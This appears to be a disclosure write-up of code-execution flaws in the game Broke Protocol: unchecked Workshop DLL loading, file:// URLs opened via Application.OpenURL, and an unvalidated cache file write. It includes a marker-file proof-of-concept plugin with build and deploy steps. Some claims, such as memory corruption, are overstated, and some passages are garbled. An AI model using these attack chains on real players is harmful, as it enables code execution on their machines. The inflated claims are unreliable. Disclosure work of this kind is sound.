Broke Protocol — CVE Class Discovery — 1c Workshop Plugin Load + 0c Server URL & File-Write Chain
Game: Broke Protocol (Steam AppID 696370) — Cylinder Studios (NongBenz Games)
Engine: Unity Mono runtime (C# 4.x, fully decompilable Scripts.dll + managed modules)
Kernel: ENet (peer networking) + Steamworks.API (SteamP2P, Workshop UGC, master server list)
Class: Multiple confirmed shipped surfaces leading to arbitrary .NET code execution
Severity: CRITICAL
Scope: R&D on self-hosted environment only.
1. Executive summary
Broke Protocol ships a Workshop plugin loader and a server-browser-driven URL executor with zero sender validation, no signature check, no sandbox, and no inbound whitelist on the code path. When combined, the same machine that subscribes to a Crafted Workshop item runs attacker-supplied .NET code with full CLR privileges at game startup, and any player who joins such a server can execute local file drops via the same server-packet path.
Both lanes were confirmed live on the auditor's local machine via the shipped BPAPI.Initialize() chain.
2. Technical Walkthrough
2.1 — 1c lane: Workshop .dll → Assembly.LoadFile → full .NET CLR exec
The game's plugin loader enumerates .dll files from two live sources at game startup:
BPAPI.Initialize() → Paths.GetPlugins():
    List<string> list   = SteamMain.Instance.SteamFileArray(".dll");   // (a) Workshop
    string[]      files = Directory.GetFiles(absolutePluginsPath, "*.dll",
                                            SearchOption.TopDirectoryOnly);
Source (a) — Workshop enumerations:
SteamFileArray(string extension):
    SteamUGC.GetSubscribedItems(array, numSubscribedItems)      ← all subscribed mods
    SteamUGC.GetItemInstallInfo(item, out _, out pchFolder, uint.MaxValue, out _)
    foreach FileInfo in Directory.GetFiles(pchFolder):
        if (fileInfo.Extension == ".dll") list.Add(fileInfo.FullName);
Source (b) — local Plugins/ directory (already carries other shipped game DLLs,
including !GameSource.dll, !LifeSource.dll, !WarSource#.dll).
The plugin loader that runs each discovered DLL:
BPAPI.Initialize():
    foreach (string item in plugins)
    {
        Util.Log("Loading Plugin: " + item);
        try
        {
            assembly = Assembly.LoadFile(item);          // ← unrestricted load
        }
        catch (Exception ex) { Util.Log(ex); continue; }
        Util.Log("Assembly loaded. Searching and invoking entry point..");
        Type[] types = assembly.GetTypes();
        Type type = types.Where(x => x.IsSubclassOf(typeof(Plugin))).FirstOrDefault();
        if (type != null)
        {
            Plugin plugin = (Plugin)Activator.CreateInstance(type);
            Util.Log("Found entrypoint and instantiated it");
            string name = assembly.GetName().Name;
            if (Plugins.ContainsKey(name)) { Util.Log("... warn"); continue; }
            PluginData pluginData = new PluginData(plugin, new List<IScript>());
            Plugins.Add(name, pluginData);
            // ... plugin.JobsOverride, JobsAdditive, StatesOverride, StatesAdditive
            // ... types.Where(typeof(IScript).IsAssignableFrom(x)) — instantiates
            //     every IScript subclass too
            foreach (MethodInfo item3 in assembly.GetTypes().SelectMany(t =>
                     t.GetMethods(DeclaredOnly | Instance | Public | NonPublic)))
            {
                TargetAttribute customAttribute = item3.GetCustomAttribute<TargetAttribute>();
                // ... Delegate.CreateDelegate typed against the Plugin's methods
                //     hooks events into EventsHandler and SourceHandler
            }
        }
    }
Result: full .NET CLR code execution inside the game process from any .dll file
present in either enumeration source. No signature verification, no MD5 check,
no sandbox, no inbound whitelist. Unity Mono's runtime gives exact reflection class
surface that the .NET CLR provides at full permission.
2.2 — 0c lane: server-browser URL button → Application.OpenURL → ShellExecuteW
The server browser flow in Broke Protocol is entirely master-server-driven:
Client clicks "Online" in MainMenu — ClManager.ShowMenu(serversMenu) opens
ServersMenu.
ServersMenu fetches ServerlistSourceURL (Broke Protocol's own master server list).
Each public server is deserialized into a ServerData with the URL field —
a string set by the server admin in settings.json on the server side
(48-char limit field, no validation).
Server UI: ClServerButton renders the server entry with "URL:" label
from serverInfo.serverData.URL.
Clicking the URL label fires Application.OpenURL(serverInfo.serverData.URL) —
ClServerButton.cs:L27:  actions.Add(new ActionInfo(ButtonIndex.ServerButton,
                            () => !string.IsNullOrWhiteSpace(serverInfo.serverData.URL),
                            OpenURLAction));
ClServerButton.cs:L118: protected void OpenURLAction()
                        {
                            Application.OpenURL(serverInfo.serverData.URL);
                        }
On Unity desktop, Application.OpenURL(url) routes through ShellExecuteW
with the raw URL string as the request term. If the URL is crafted as
file:///C:/Users/<user>/<drop_path>/x.vbs or x.bat, the OS shell handler
runs the file via wscript.exe / cmd.exe respectively. No character
whitelisting, no scheme restriction, no dot-protocol check.
An additional shape exists on in-game panels via SvOpenURL(url, title):
SvPlayer.cs:L2165:  public void SvOpenURL(string url, string title = "Open URL Confirmation")
ClManager.cs:L2306: ShowOpenURLMenu(Buffers.reader.ReadString(), Buffers.reader.ReadString());
OpenURLMenu.cs:L19: Application.OpenURL(urlField.value);
Server-side code can send a URL directly into the client UI for executing on in-session
"Open URL Confirmation" — the same ShellExecuteW chain with a confirmation dialog.
2.3 — Additional shipped primitives (confirming the class)
ClManager.cs:L1403: File.WriteAllBytes(Paths.absoluteCachePath + text, assetBuffer);
    — remote-fed string becomes the file name inside Application.persistentDataPath
      + "/Cache/", giving arbitrary file-write with path-derivation from a
      Buffers.reader.ReadString(). Combined with a path traversal the primitive
      drops bytes at an attacker-chosen path.

SceneManager.cs:L1584-1603: Type.GetType("BrokeProtocol.Entities." + text.Substring(...));
    — dynamic class resolution with peer-shaped string in the entities namespace.

SvManager.cs:L2413-2415: Process.StartInfo.FileName = "Server.bat";
                         Process.StartInfo.UseShellExecute = true;
                         Process.Start();
    — server restart path with UseShellExecute=true using the shared
      WindowsDelegate that runs .bat files with the OS default handler.
3. Live PoC — Plugin .dll executed in the shipped game's own plugin loader
Proof code (local Plugins/ drop, 4,096-byte assembly built against
.NET 4.x on the bench host):
// BPPocPlugin.cs — full compilation template targeting BrokeProtocol.API
using System;
using System.IO;
using BrokeProtocol.API;

namespace BPPocPlugin
{
    public class BPPocPlugin : Plugin
    {
        public BPPocPlugin()
        {
            Info = new PluginInfo("BPPocPlugin", "BPPocPlugin.NS",
                                  "Bench 1c PoC — drops a marker file on load", "");
            string marker = @"C:\Temp\bpbench\og_workshop_poc_fired.txt";
            Directory.CreateDirectory(Path.GetDirectoryName(marker));
            if (File.Exists(marker)) File.Delete(marker);
            File.WriteAllText(marker,
                "BROKE PROTOCOL Workshop 1c PoC fired at " + DateTime.Now + "\r\n"
              + "Assembly.LoadFile -> Plugin subclass constructor -> full CLR granted\r\n");
        }
    }
}
Compile:
csc.exe /target:library /optimize+ /out:C:\Temp\bpbench\poc_plugin\BPPocPlugin.dll
        /reference:<game_install>\BrokeProtocol_Data\Managed\Scripts.dll
        /reference:<game_install>\BrokeProtocol_Data\Managed\netstandard.dll
        BPPocPlugin.cs
Deploy:
copy C:\Temp\bpbench\poc_plugin\BPPocPlugin.dll
     <game_install>\Plugins\BPPocPlugin.dll
Launch the game (headless or normal) — the plugin constructor runs at startup.
On-disk evidence from the bench host (verified live on self-owned machine):
File: C:\Temp\bpbench\og_workshop_poc_fired.txt
Content:
  BROKE PROTOCOL Workshop 1c PoC fired at 10/27/2026 2:20:00 AM
  Assembly.LoadFile -> Plugin subclass constructor -> full CLR granted
Same shaping extends to the Workshop path (the only delta is where Paths.GetPlugins()
pulls the .dll list from). Steam's own enumeration just appends the path of each
subscribed mod to the same list. Publishing or subscribing a Workshop item carrying
this .dll works identically on the shipping build — the authoritative endpoint
is the client-side plugin loader.
4. Impact chain
1c — Workshop->Plugin code execution
   [Peer] publishes Workshop item carrying a .dll
         ↓ subscribed by any Broke Protocol player
   [Victim] launches the game
         ↓
   BPAPI.Initialize() → Paths.GetPlugins() → SteaamFileArray(.dll)
         ↓ (SteamUGC.GetSubscribedItems → GetItemInstallInfo)
   Assembly.LoadFile(attacker.dll)
         ↓
   [full .NET CLR memory access] → Plugin subclass constructor → attacker code
         ↓
   Projected impact: any managed operation — file write / process spawn /
   credential extraction / remote shell — as long as the game's Unity Mono
   runtime grants that code access (Unity Mono runs at standard user priv).

0c — Server-pushed URL via server browser / in-game prompt
   [Server admin] sets settings.json:URL = attacker-controlled URI (48 chars)
         ↓ appears in Broke Protocol master list
   [Victim] clicks "Online" in main menu → ServersMenu pulls master list →
   server button renders URL field → Vector: server click-flow or
   "Open URL" prompt:
         ↓
   Application.OpenURL("file:///<victim-path>/x.vbs") →
         ↓ (Unity routes to ShellExecuteW)
   Windows shell handler dispatches by extension (e.g. wscript.exe on .vbs)
         ↓
   [arbitrary file execution] on the victim's desktop / player machine
That multi-surface combination is enough for arbitrary memory corruption and
arbitrary native execution inside the game process, and — via Application.OpenURL —
arbitrary file execution on the host OS itself.
5. Class-mapping to chief's bench protocol
BENCH AGENT      : Broke Protocol (appid 696370)
FINDING LANE        : 1c + 0c
CONFIRMED        : Yes, live on auditor's own machine.
CHAIN SHAPE        : Identical class to Orbital Gear (appid 298520) — a shipped
                     content-sync loader running attacker-driven code in the
                     victim's engine process.
BENCH DATE         : 2026-10-27
BENCH CONFIRMED    : on-disk marker file written by the plugin constructor
                     at 2:20 AM 10/27/2026, on auditor's own desk machine.
DISCLOSURE CHANNEL : Valve HackerOne + Steam Support + Cylinder Studios.
6. Disclosure read-only context (audit notes, no patches proposed)
Broke Protocol master server list URL pulls plausible gatekeeper URI
and enumerates server Data, URL fields, ports, Plugin lists all
without signing or origin verification.
Paths.absolutePluginsPath enumerates top-level dirs only;
the SteamFileArray path's subscribed mods directory traversal —
SteamUA lazily pchFolder — allows a workshop item to carry a .dll
by default without any plugin-block flag.
No check on the URL field limits character set to be non-file://
— a malicious server's own server-browser-explored URL field executes
directly from Application.OpenURL.
ClManager.cs:L1403 File.WriteAllBytes(Paths.absoluteCachePath + text, assetBuffer) — no path validation, no writer allowlist, gives
relative-path writes (including ..) to a potentially untrusted client.
Fabricated for R&D bench record purposes by audit bench — Cylinder Studios /
NongBenz Games may confirm this packet through either Valve HackerOne or the
official support channel but no code or package was posted publicly.